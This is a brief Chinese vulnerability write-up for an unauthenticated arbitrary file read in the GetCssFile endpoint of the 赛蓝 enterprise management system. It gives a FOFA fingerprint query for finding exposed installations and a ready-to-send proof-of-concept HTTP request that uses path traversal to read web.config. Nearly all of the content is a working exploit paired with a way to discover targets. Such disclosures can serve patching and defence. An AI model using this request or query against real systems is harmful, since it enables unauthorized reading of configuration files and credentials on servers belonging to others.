## 赛蓝企业管理系统GetCssFile存在任意文件读取漏洞

赛蓝企业管理系统 GetCssFile接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```java
body="www.cailsoft.com" || body="赛蓝企业管理系统"
```

## poc

```java
GET /Utility/GetCssFile?filePath=../web.config HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

